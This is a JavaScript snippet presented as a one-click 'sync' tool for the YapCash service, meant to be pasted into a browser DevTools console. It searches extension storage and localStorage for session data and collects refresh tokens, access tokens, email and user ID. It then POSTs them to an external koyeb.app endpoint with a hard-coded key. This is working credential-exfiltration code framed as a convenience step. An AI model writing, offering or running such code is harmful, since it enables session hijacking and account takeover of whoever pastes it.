/**
 * ⚡ YapCash Universal 1-Click Chrome DevTools Sync Snippet
 * 
 * Works anywhere: 
 * 1. Webpage DevTools Console (yap.cash)
 * 2. Extension Popup Inspect Console
 * 3. Extension Background Worker Console
 */

(async function () {
  const KOYEB_URL = "https://conservation-lory-agentdark-7e1cc3c7.koyeb.app/api/sync-token";
  const SYNC_SECRET = "yapcash_secret_2026";

  console.log("🔍 Scanning for active YapCash session tokens...");

  let refreshToken = null;
  let accessToken = null;
  let email = null;
  let userId = null;

  // Method 1: Scan chrome.storage.local (Extension Context)
  if (typeof chrome !== "undefined" && chrome.storage && chrome.storage.local) {
    try {
      const data = await new Promise(r => chrome.storage.local.get(null, r));
      if (data) {
        refreshToken = data.refreshToken || (data.session && data.session.refresh_token);
        accessToken = data.accessToken || (data.session && data.session.access_token);
        email = data.email || (data.user && data.user.email);
        userId = data.userId || (data.user && data.user.id);

        for (const k of Object.keys(data)) {
          if (k.includes("auth-token") || k.includes("supabase")) {
            try {
              const p = typeof data[k] === "string" ? JSON.parse(data[k]) : data[k];
              refreshToken = refreshToken || p.refresh_token || p.currentSession?.refresh_token;
              accessToken = accessToken || p.access_token || p.currentSession?.access_token;
              if (p.user) {
                email = email || p.user.email;
                userId = userId || p.user.id;
              }
            } catch (_) {}
          }
        }
      }
    } catch (_) {}
  }

  // Method 2: Scan window.localStorage (Webpage Context)
  if (!refreshToken && typeof window !== "undefined" && window.localStorage) {
    try {
      for (let i = 0; i < localStorage.length; i++) {
        const k = localStorage.key(i);
        if (k && (k.includes("auth-token") || k.includes("supabase") || k.includes("token") || k.includes("session"))) {
          const val = localStorage.getItem(k);
          try {
            const p = JSON.parse(val);
            if (p) {
              refreshToken = refreshToken || p.refresh_token || p.currentSession?.refresh_token;
              accessToken = accessToken || p.access_token || p.currentSession?.access_token;
              if (p.user) {
                email = email || p.user.email;
                userId = userId || p.user.id;
              }
            }
          } catch (_) {
            if (val && val.length > 20 && !val.includes("{")) {
              refreshToken = refreshToken || val;
            }
          }
        }
      }
    } catch (_) {}
  }

  if (!refreshToken) {
    alert("❌ No active YapCash token found! Please make sure you are logged into YapCash in this browser tab.");
    console.error("❌ Token scan failed: No session token found in chrome.storage or localStorage.");
    return;
  }

  console.log("⚡ Session token found! Transmitting to Koyeb Cloud...");

  try {
    const res = await fetch(KOYEB_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "x-sync-key": SYNC_SECRET,
      },
      body: JSON.stringify({ refreshToken, accessToken, email, userId }),
    });

    const resData = await res.json();

    if (res.ok && resData.ok) {
      console.log(`✅ [SUCCESS] Synced live to Koyeb! Account: ${resData.accountId} (${resData.email})`);
      alert(`🟢 SUCCESS! YapCash Account Synced Live!\n\nID: ${resData.accountId}\nEmail: ${resData.email}\nXP: ${resData.totalXp || 0}\nCountry: ${resData.rewardCountry || "US"}`);
    } else {
      console.error("❌ Sync Error from Koyeb:", resData.error || res.statusText);
      alert(`❌ Sync Failed: ${resData.error || "Server error"}`);
    }
  } catch (err) {
    console.error("❌ Network Error:", err.message);
    alert(`❌ Network Error connecting to Koyeb: ${err.message}`);
  }
})();
